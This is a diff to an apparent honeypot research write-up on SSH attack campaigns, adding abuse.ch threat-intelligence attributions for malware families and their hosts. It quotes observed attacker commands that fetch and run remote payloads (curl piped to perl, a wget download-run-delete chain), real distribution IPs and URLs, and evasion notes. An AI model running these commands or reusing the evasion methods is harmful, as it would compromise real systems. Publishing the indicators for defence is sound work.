@@ -748,11 +748,11 @@ gantt
     root password change — 1262 sessions    :active, 2026-05-01, 2026-09-21
 
     section Droppers
-    kswpad — 40 sessions, 1 IP              :2026-05-13, 2026-09-16
+    kswpad (BillGates) — 40 sessions, 1 IP  :2026-05-13, 2026-09-16
     /linux dropper — 17 sessions, 16 IPs    :2026-05-05, 2026-09-14
     Direct ELF upload — 19 sessions         :2026-05-05, 2026-09-14
     multics.x64 — 1 session                 :2026-05-01, 2026-05-02
-    fakepika (Mirai) — 2 sessions           :2026-06-17, 2026-06-18
+    fakepika (Diicot) — 2 sessions          :2026-06-17, 2026-06-18
 
     section September wave
     zed + perl — 5 sessions                 :crit, 2026-09-15, 2026-09-20
@@ -761,7 +761,7 @@ gantt
 
 **Outlaw is permanent.** From 21 May to 21 September without interruption, 332 distinct IPs, always the same key and the same recon block. It is the constant background of the internet.
 
-**`kswpad`: 40 sessions, a single IP.** One persistent operator who kept coming back for four months. Because the honeypot preserves their qcow2 overlay, they found "their" machine again on every visit.
+**`kswpad`: 40 sessions, a single IP.** One persistent operator who kept coming back for four months. Because the honeypot preserves their qcow2 overlay, they found "their" machine again on every visit. URLhaus identifies two of the family's binaries as **BillGates** (a.k.a. Elknot), a long-running Linux DDoS bot: this operator was after bandwidth, not CPU.
 
 **The September wave.** The `zed`+`perl` and `bo.sh` campaigns only appear at the very end of the window (15–20 September), each from 5 distinct IPs. The style is Outlaw — the `zed` payload is a Perl IRC bot script — but with new infrastructure and a cleaner delivery method.
 
@@ -797,6 +797,8 @@ pkill kswpad
 
 Dropping into `/etc` rather than `/tmp` is deliberate: `/tmp` is often mounted `noexec` and wiped on reboot, `/etc` never is. The port rotation (3594 → 26346, 35415 → 62123) is basic block evasion.
 
+URLhaus identifies `kal64` and `kswpad` as **BillGates / Elknot**, a Linux DDoS bot. The infrastructure is not dedicated to it either: ThreatFox lists `151.241.154.172` as a **Remcos** command-and-control server (a Windows RAT), and `195.177.94.72` has also served Windows payloads, tagged `exe`, `msi` and `connectwise`.
+
 ### The "/linux" family — one binary, many hosts
 
 The same URL pattern across 13 different hosts, mostly Alibaba Cloud addresses:
@@ -820,6 +822,8 @@ The same URL pattern across 13 different hosts, mostly Alibaba Cloud addresses:
 
 Each host uses a different high port. The infrastructure is disposable: each IP serves only a handful of sessions before being replaced.
 
+URLhaus confirms the "one binary" part: the same file (SHA-256 `a505de0a…`) was collected from 7 of these hosts. Two of the family's hosts are tagged **P2Pinfect**, a Rust worm that spreads over Redis and SSH and ships a miner — a likely, but indirect, identification.
+
 ### The "zed" family — Perl IRC bot
 
 ```bash
@@ -835,13 +839,15 @@ timeout 60 curl -sS http://154.70.152.216/zed | perl >/dev/null 2>&1 &
 
 The `curl | perl` pipe is notable: **nothing is written to disk**. The script runs straight from memory, which makes it invisible to file-scanning antivirus. The `nohup … </dev/null &` with triple redirection guarantees survival after the SSH session closes.
 
+URLhaus has collected **15 different Perl scripts** from `154.70.152.216/zed`: the content changes from one download to the next, while the URL stays the same.
+
 ### Others
 
 | Host | Country | URL | Note |
 |---|---|---|---|
-| `45.153.34.212` | 🇳🇱 Netherlands | `45.153.34.212/fakepika`, `:8181/.bia`, `:8181/.dcplm` | Mirai variant; dotfiles to hide from a plain `ls` |
-| `64.89.161.144` | 🇺🇸 United States | `:28816/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG` | randomized path — URL signature evasion |
-| `31.56.209.39` | 🇳🇱 Netherlands | `/wget.sh`, `/curl.sh` | dual dropper depending on available tooling |
+| `45.153.34.212` | 🇳🇱 Netherlands | `45.153.34.212/fakepika`, `:8181/.bia`, `:8181/.dcplm` | attributed by ThreatFox to **Diicot**, a Romanian-speaking group: Mirai dropper and XMRig mining proxy; dotfiles to hide from a plain `ls` |
+| `64.89.161.144` | 🇺🇸 United States | `:28816/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG` | **XMRig** miner according to URLhaus; randomized path — URL signature evasion |
+| `31.56.209.39` | 🇳🇱 Netherlands | `/wget.sh`, `/curl.sh` | **Mirai** according to URLhaus; dual dropper depending on available tooling |
 | `59.110.9.189` | 🇨🇳 China | `:9684/linux` | `/linux` family |
 
 The full `fakepika` chain is a textbook "download, run, delete" pattern:
@@ -859,6 +865,14 @@ echo "history -cw; cd /tmp; rm -rf *.sh; rm -rf bizy*; rm -rf odin*; wget http:/
 ```
 
 `bizy*` and `odin*` are rival families.
+
+### Cross-check with public threat intelligence
+
+After the study, I looked up every URL and host in the [abuse.ch](https://abuse.ch/) databases (URLhaus, ThreatFox, MalwareBazaar). Metadata only: nothing was downloaded.
+
+- **Coverage**: 23 of the 46 URLs and 14 of the 24 hosts were already known. The other 10 hosts — mostly from the `/linux` family, plus `66.116.243.130` — appear in none of the three databases.
+- **Families**: every identified family is either a miner (XMRig, P2Pinfect) or a DDoS bot (BillGates, Mirai). None is an information stealer — which matches what the recon commands suggested: the target is the machine's resources, not its content.
+- **Caveat**: these are third-party labels, not my own analysis of the binaries.
 
 ### Geographic summary of the distribution infrastructure
 
@@ -927,6 +941,6 @@ The architecture that makes this honeypot safe also shapes what it can see. Four
 
 - **Data**: the honeypot's SQLite database, 2026-04-28 to 2026-09-21. Commands were reconstructed from the input (`"i"`) streams of the asciinema v2 recordings, not from shell history — so nothing escapes via `history -c`.
 - **Geolocation**: MaxMind GeoLite2-Country database, queried **locally**. No IP address was sent to any third-party service.
-- **Payloads**: no binary or script was downloaded, dynamically analyzed, or executed. The microVM has no network interface; every download attempt failed at the socket layer. The published URLs come exclusively from reading keystrokes.
+- **Payloads**: no binary or script was downloaded, dynamically analyzed, or executed. The microVM has no network interface; every download attempt failed at the socket layer. The published URLs come exclusively from reading keystrokes. On 2026-10-03, the URLs and distribution hosts were looked up in the abuse.ch databases (URLhaus, ThreatFox, MalwareBazaar); this is the only data sent to a third party, and it consists of indicators already published here.
 - **Privacy**: the IP addresses published are those of machines that actively attacked a third-party system, and those of malware distribution infrastructure. They are released as indicators of compromise.
 - **Attribution**: none. IP geolocation describes the location of infrastructure, not the identity or nationality of an operator.
